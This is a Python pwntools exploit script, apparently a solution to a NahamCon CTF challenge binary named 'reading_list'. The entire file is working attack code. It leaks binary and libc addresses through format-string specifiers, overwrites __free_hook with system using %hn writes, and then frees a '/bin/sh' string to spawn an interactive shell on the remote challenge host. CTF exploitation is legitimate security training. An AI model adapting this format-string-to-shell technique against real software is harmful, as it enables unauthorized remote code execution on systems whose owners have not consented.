#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template reading_list_patched
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF('reading_list')
libc = ELF('./libc.so')

HOST, PORT = "challenge.nahamcon.com 31004".split()

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.REMOTE:
        return remote(HOST, PORT)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak main
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Full RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      PIE enabled
# RUNPATH:  b'.'

def menu_choice(input: int) -> None:
    io.sendlineafter(b"> ", str(input).encode())

def menu_choice_raw(input: bytes) -> None:
    io.sendlineafter(b"> ", str(input).encode())

def print_list() -> bytes:
    menu_choice(1)
    io.recvuntil(b"list\n")
    res = io.recvuntil(b"\n\n", drop=True)
    return res

def add(name: bytes) -> None:
    menu_choice(2)
    io.sendlineafter(b"name: ", name)

def remove(index: int) -> bytes:
    menu_choice(3)
    io.recvuntil(b"list\n", drop=True)
    res = io.recvuntil(b": ", drop=True)
    io.sendline(str(index).encode())
    return res

def change_name(name: bytes) -> None:
    menu_choice(4)
    io.sendlineafter(b"name: ", name)

def fmt_str_attack(address: int, value: int) -> None:
    vals = [0] * 3
    vals[0] = value & 0xffff
    vals[1] = (value >> 16) & 0xffff
    vals[2] = (value >> 32) & 0xffff

    name_payload = b""
    for i in range(len(vals)):
        name_payload += p64(address + (2*i))

    change_name(name_payload)

    payload = b""
    prev = 0
    for i in range(len(vals)):
        if vals[i] < prev:
            vals[i] = vals[i] | 0x10000
        payload += f"%{vals[i] - prev}c".encode()
        payload += f"%{buffer_offset+i}$hn".encode()
        prev = vals[i]
    log.info(f"sending payload: {payload}")
    add(payload)

    remove(1)

io = start()

io.sendlineafter(b"name: ", b"A"*0x30)

bin_leak_offset = 6
libc_leak_offset = 31
buffer_offset = 22

payload = b""
for i in [bin_leak_offset, libc_leak_offset]:
    payload += b"%" + str(i).encode() + b"$p;"
add(payload)

leaks = remove(1).decode()[3:]
leaks = leaks.split(";")
exe.address = int(leaks[0], 0) - exe.sym["__libc_csu_init"]
log.success(f"binary @ {hex(exe.address)}")
libc.address = int(leaks[1], 0) - libc.sym["__libc_start_main"] - 0xf3
log.success(f"libc @ {hex(libc.address)}")

fmt_str_attack(libc.sym["__free_hook"], libc.sym.system)

add(b"/bin/sh\x00")
remove(1)

io.interactive()

